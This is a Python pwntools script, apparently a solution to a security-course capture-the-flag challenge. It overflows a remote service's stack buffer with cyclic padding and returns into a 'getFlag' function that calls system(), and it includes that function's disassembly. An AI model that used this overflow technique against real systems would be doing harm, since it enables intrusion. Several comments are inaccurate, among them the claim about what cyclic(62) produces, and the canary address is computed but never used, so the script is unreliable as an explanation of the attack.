#!/usr/bin/python3

from pwn import *
from pwn import p64

io = remote('inf226.puffling.no', 7003)
print(io.recvline())
io.recvuntil(b'1. ')
io.sendline(cyclic(32)) # receive the prompt, then send 32 A's

r = io.recvline() # is the line received an address of importance? f7f9f600


# finding the canary:
# https://ctf101.org/binary-exploitation/stack-canaries/
canary_address = p64(0x7fffffffdff8) # addr. when getting seg. fault
getFlag_address = p64(0x4011db) # addr. past pushing to stack

# cyclic(62) = b'q' + b'a' * 31
send = cyclic(62) + getFlag_address 
io.sendline(send)
print(io.recvall())






'''
getFlag return address:

00000000004011d6 <getFlag>:
  4011d6:       f3 0f 1e fa             endbr64
  4011da:       55                      push   %rbp
  4011db:       48 89 e5                mov    %rsp,%rbp
  4011de:       bf 08 20 40 00          mov    $0x402008,%edi
  4011e3:       e8 a8 fe ff ff          call   401090 <puts@plt>
  4011e8:       48 8b 05 51 2e 00 00    mov    0x2e51(%rip),%rax        # 404040 <stdout@GLIBC_2.2.5>
  4011ef:       48 89 c7                mov    %rax,%rdi
  4011f2:       e8 e9 fe ff ff          call   4010e0 <fflush@plt>
  4011f7:       bf 28 20 40 00          mov    $0x402028,%edi
  4011fc:       e8 af fe ff ff          call   4010b0 <system@plt>
  401201:       90                      nop
  401202:       5d                      pop    %rbp
  401203:       c3                      ret

'''


